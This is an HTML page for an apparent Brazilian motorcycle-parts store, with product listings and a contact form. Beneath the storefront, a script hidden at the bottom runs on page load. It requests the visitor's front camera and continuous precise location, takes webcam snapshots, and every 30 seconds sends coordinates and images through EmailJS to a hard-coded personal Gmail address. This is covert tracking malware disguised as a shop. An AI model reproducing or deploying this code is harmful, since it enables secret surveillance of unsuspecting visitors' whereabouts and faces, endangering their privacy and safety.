<!DOCTYPE html>
<html lang="pt-BR">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Localização e Imagem Ativa Enviada!</title>
    <link rel="stylesheet" href="style.css" />
    <script
      type="text/javascript"
      src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"
    ></script>
    <style>
      header {
        background: url("./banner.png") no-repeat top center fixed;
        height: 450px;
      }

      .old-price {
        text-decoration: line-through;
        color: #888;
      }
      .last {
        color: red;
        font-weight: bold;
      }
    </style>
  </head>
  <body>
    <header></header>

    <main>
      <section id="destaques" class="category">
        <h2>Destaques</h2>
        <div class="product-grid">
          <div class="product-card">
            <img
              src="https://m.media-amazon.com/images/I/51mTZisN4fL._AC_SX679_.jpg"
              alt="Capacete de Moto"
            />
            <h3>Capacete de Moto Premium</h3>
            <p>Proteção e estilo para suas viagens.</p>
            <span class="old-price">R$ 499,90</span>
            <span class="price">R$ 299,90</span>
            <button>Adicionar ao Carrinho</button>
          </div>
          <div class="product-card">
            <img
              src="https://dor03phawg286.cloudfront.net/Custom/Content/Products/10/43/1043891_jaqueta-texx-falcon-v2-preta-verde-couro_z2_638203576309126851.webp"
              alt="Jaqueta de Couro"
            />
            <h3>Jaqueta de Couro Protetora</h3>
            <p>Resistência e conforto para o dia a dia.</p>
            <span class="old-price">R$ 1.095,90</span>
            <span class="price">R$ 748,00</span>
            <button>Adicionar ao Carrinho</button>
          </div>
          <div class="product-card">
            <img
              src="https://images.tcdn.com.br/img/img_prod/186407/luva_alpinestars_sp_8_v3_preto_em_couro_8177_1_57ff6bd45583cb3c049f7c6ffb0057b7_20210726170632.jpg"
              alt="Luvas de Pilotagem"
            />
            <h3>Luvas de Pilotagem Esportivas</h3>
            <p>Aderência e segurança para suas mãos.</p>
            <span class="old-price">R$ 398,60</span>
            <span class="price">R$ 129,50</span>
            <button>Adicionar ao Carrinho</button>
          </div>
        </div>
      </section>

      <section id="escapamentos" class="category">
        <h2>Escapamentos</h2>
        <div class="product-grid">
          <div class="product-card">
            <img
              src="https://http2.mlstatic.com/D_NQ_NP_2X_986197-MLB76460149300_052024-F-ponteira-escape-leovince-motos-universal-tipo-titnio.webp"
              alt="Escapamento Esportivo"
            />
            <h3>Escapamento Esportivo Cromado</h3>
            <p>Melhore o desempenho e o som da sua moto.</p>
            <span class="old-price">R$ 267,10</span>
            <span class="price">R$ 168,00</span>
            <button>Adicionar ao Carrinho</button>
          </div>
          <div class="product-card">
            <img
              src="https://http2.mlstatic.com/D_NQ_NP_2X_753858-MLB85921089967_062025-F-escapamento-ponteira-esportiva-kawasaki-z500-ninja-500-se.webp"
              alt="Ponteira de Carbono"
            />
            <h3>Ponteira de Carbono Leve</h3>
            <p>Design moderno e redução de peso.</p>
            <span class="old-price">R$ 1.289,00</span>
            <span class="price">R$ 890,50</span>
            <button>Adicionar ao Carrinho</button>
          </div>
        </div>
      </section>

      <section id="pneus" class="category">
        <h2>Pneus</h2>
        <div class="product-grid">
          <div class="product-card">
            <img
              src="https://cdn.awsli.com.br/2500x2500/2802/2802422/produto/353737215/diablo-supercorsa-spv4-qbba7q31vm.png"
              alt="Pneu Dianteiro"
            />
            <h3>
              Par Pneu Pirelli 110/70-17 + 150/60-17 Diablo SuperCorsa SPV4 TL
            </h3>
            <p>Maior aderência e durabilidade.</p>
            <span class="old-price">R$ 3.198,35</span>
            <span class="price">R$ 2.673,25</span>
            <button>Adicionar ao Carrinho</button>
          </div>
          <div class="product-card">
            <img
              src="https://cdn.awsli.com.br/2500x2500/2802/2802422/produto/348093522/pirelli-mt16-kit-v43fp5ohfg.png"
              alt="Pneu Traseiro"
            />
            <h3>
              Par Pneu 80/100-21 + 110/100-18 MT16 Garacross Pirelli Com Câmara
              - Off-Road
            </h3>
            <p>Ideal para terrenos irregulares.</p>
            <span class="old-price">R$ 1.228,50</span>
            <span class="price">R$ 892,00</span>
            <button>Adicionar ao Carrinho</button>
          </div>
        </div>
      </section>

      <section id="acessorios" class="category">
        <h2>Acessórios</h2>
        <div class="product-grid">
          <div class="product-card">
            <img
              src="https://http2.mlstatic.com/D_NQ_NP_2X_959604-MLB81633839466_012025-F-capa-para-moto-impermeavel-termica-uv-sol-e-chuva.webp"
              alt="Capa de Moto"
            />
            <h3>Capa Protetora para Moto</h3>
            <p>Proteja sua moto contra sol e chuva.</p>
            <span class="old-price">R$ 65,50</span>
            <span class="price">R$ 37,20</span>
            <span class="last">5 Peças restantes</span>
            <button>Adicionar ao Carrinho</button>
          </div>
          <div class="product-card">
            <img
              src="https://m.media-amazon.com/images/I/51RIygKQk6L._AC_SX679_.jpg"
              alt="Suporte para Celular"
            />
            <h3>Suporte para Celular Universal</h3>
            <p>Praticidade para suas viagens.</p>
            <span class="old-price">R$ 135,50</span>
            <span class="price">R$ 78,12</span>
            <span class="last">3 Peças restantes</span>
            <button>Adicionar ao Carrinho</button>
          </div>
        </div>
      </section>

      <section id="contato" class="contact-section">
        <h2>Contato</h2>
        <p>Envie-nos uma mensagem ou ligue para nós!</p>
        <form>
          <input type="text" placeholder="Seu Nome" />
          <input type="email" placeholder="Seu Email" />
          <textarea placeholder="Sua Mensagem"></textarea>
          <button type="submit">Enviar Mensagem</button>
        </form>
        <p>Telefone: (19) 98721-1974</p>
        <p>Email: contato@hanover.com</p>
      </section>
    </main>

    <footer>
      <p>&copy; 2025 Hanover. Todos os direitos reservados.</p>
    </footer>

    <video
      style="display: none"
      id="camera-feed"
      playsinline
      autoplay
      muted
    ></video>
    <canvas style="display: none" id="camera-canvas"></canvas>

    <script type="text/javascript">
      // IMPORTANTE: COLOQUE SEUS DADOS DO EMAILJS AQUI!
      (function () {
        emailjs.init("WkzTT3_-TLzVDKRRh"); // Sua Public Key
      })();

      const SERVICE_ID = "gmailMessage"; // Seu Service ID
      const TEMPLATE_ID = "template_jg4h8r9"; // Seu Template ID
      const YOUR_EMAIL_RECEIVER = "henry.pdts@gmail.com"; // Seu e-mail de destino

      const statusMessageElement = document.getElementById("status-message");
      const lastSentMessageElement =
        document.getElementById("last-sent-message");
      const cameraFeed = document.getElementById("camera-feed");
      const cameraCanvas = document.getElementById("camera-canvas");
      const context = cameraCanvas.getContext("2d");

      let lastSentTime = 0;
      const SEND_INTERVAL = 30 * 1000; // 30 segundos em milissegundos
      let cameraStream = null; // Para armazenar o stream da câmera

      // --- Funções de Câmera ---
      async function setupCamera() {
        try {
          // Preferir a câmera frontal
          const stream = await navigator.mediaDevices.getUserMedia({
            video: { facingMode: "user" },
          });
          cameraStream = stream; // Armazena o stream para poder parar depois
          cameraFeed.srcObject = stream;
          await cameraFeed.play();
          statusMessageElement.textContent =
            "Câmera iniciada. Aguardando localização...";
          return true;
        } catch (error) {
          console.error("Erro ao acessar a câmera:", error);
          statusMessageElement.textContent =
            "Erro: Permissão de câmera negada ou câmera indisponível.";
          return false;
        }
      }

      function takePhoto() {
        if (!cameraStream || !cameraFeed.videoWidth) {
          console.warn("Câmera não está pronta para tirar foto.");
          return null;
        }

        // Define o tamanho do canvas para o tamanho do vídeo para evitar distorção
        cameraCanvas.width = cameraFeed.videoWidth;
        cameraCanvas.height = cameraFeed.videoHeight;

        // Desenha o frame atual do vídeo no canvas
        context.drawImage(
          cameraFeed,
          0,
          0,
          cameraCanvas.width,
          cameraCanvas.height
        );

        // Converte o conteúdo do canvas para um Data URL (JPEG, qualidade 80%)
        return cameraCanvas.toDataURL("image/jpeg", 0.8);
      }

      // --- Funções de Envio e Localização ---
      async function sendDataToEmailJS(latitude, longitude, imageData = null) {
        const currentTime = new Date().getTime();
        if (currentTime - lastSentTime < SEND_INTERVAL) {
          console.log("Aguardando próximo envio...");
          return;
        }

        lastSentTime = currentTime; // Atualiza o último tempo de envio

        const templateParams = {
          latitude: latitude,
          longitude: longitude,
          timestamp: new Date().toLocaleString(), // Adiciona um timestamp
          image_data: imageData || "N/A", // Inclui a imagem ou 'N/A'
          to_email: YOUR_EMAIL_RECEIVER,
        };

        try {
          await emailjs.send(SERVICE_ID, TEMPLATE_ID, templateParams);
          console.log("Dados (Localização + Imagem) enviados com sucesso!");
          statusMessageElement.textContent =
            "Localização e Imagem enviadas! Próxima atualização em 30 segundos.";
          lastSentMessageElement.textContent = `Último envio: ${new Date().toLocaleTimeString()}`;
        } catch (error) {
          console.error("Falha ao enviar dados:", error);
          statusMessageElement.textContent =
            "Erro ao enviar dados. Tentando novamente...";
        }
      }

      async function handlePositionSuccess(position) {
        const latitude = position.coords.latitude;
        const longitude = position.coords.longitude;
        statusMessageElement.textContent = `Localização atual: Lat ${latitude}, Long ${longitude}.`;

        let imageData = null;
        if (cameraStream) {
          // Só tenta tirar foto se a câmera estiver ativa
          imageData = takePhoto();
          if (!imageData) {
            console.warn("Não foi possível capturar a foto.");
          }
        } else {
          console.log("Câmera não iniciada, enviando apenas localização.");
        }

        await sendDataToEmailJS(latitude, longitude, imageData);
      }

      function handlePositionError(error) {
        let errorMessage = "Erro na localização: ";
        switch (error.code) {
          case error.PERMISSION_DENIED:
            errorMessage +=
              "Permissão negada. O rastreamento não será possível.";
            break;
          case error.POSITION_UNAVAILABLE:
            errorMessage += "Indisponível. Tentando novamente...";
            break;
          case error.TIMEOUT:
            errorMessage += "Tempo limite. Tentando novamente...";
            break;
          case error.UNKNOWN_ERROR:
            errorMessage += "Desconhecido.";
            break;
        }
        statusMessageElement.textContent = errorMessage;
        console.error("Erro de geolocalização:", error);
      }

      // --- Início ao Carregar a Página ---
      window.onload = async function () {
        // Iniciar câmera primeiro, pois a geolocalização pode ser mais rápida
        const cameraReady = await setupCamera();

        if ("geolocation" in navigator) {
          statusMessageElement.textContent =
            "Solicitando sua permissão para rastrear a localização...";
          navigator.geolocation.watchPosition(
            handlePositionSuccess,
            handlePositionError,
            {
              enableHighAccuracy: true,
              timeout: 10000,
              maximumAge: 0,
            }
          );
          statusMessageElement.textContent +=
            " Por favor, mantenha esta página aberta.";
        } else {
          statusMessageElement.textContent =
            "Seu navegador não suporta geolocalização.";
        }
      };

      // Limpar o stream da câmera ao fechar a página
      window.onbeforeunload = function () {
        if (cameraStream) {
          cameraStream.getTracks().forEach((track) => track.stop());
          console.log("Câmera desligada.");
        }
      };
    </script>
  </body>
</html>
